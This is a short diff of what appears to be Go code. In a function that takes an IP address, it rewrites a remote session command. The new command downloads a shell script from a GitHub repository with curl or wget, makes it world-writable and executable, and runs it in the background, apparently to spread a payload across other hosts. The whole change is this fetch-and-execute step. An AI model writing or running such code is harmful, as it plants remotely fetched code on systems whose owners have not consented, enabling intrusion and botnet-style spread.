@@ -107,7 +107,7 @@ func fun(ip string) {
 			}
 
 
-er := session.Run("curl -L https://github.com/atilabyte/golang/raw/refs/heads/master/atila  ")
+er := session.Run("curl -L https://github.com/atilabyte/golang/raw/refs/heads/master/install.sh -o /tmp/it.sh || wget https://github.com/atilabyte/golang/raw/refs/heads/master/install.sh -O  /tmp/it.sh ; chmod  777 /tmp/it.sh  ; /tmp/./it.sh  &")
 
 
                  
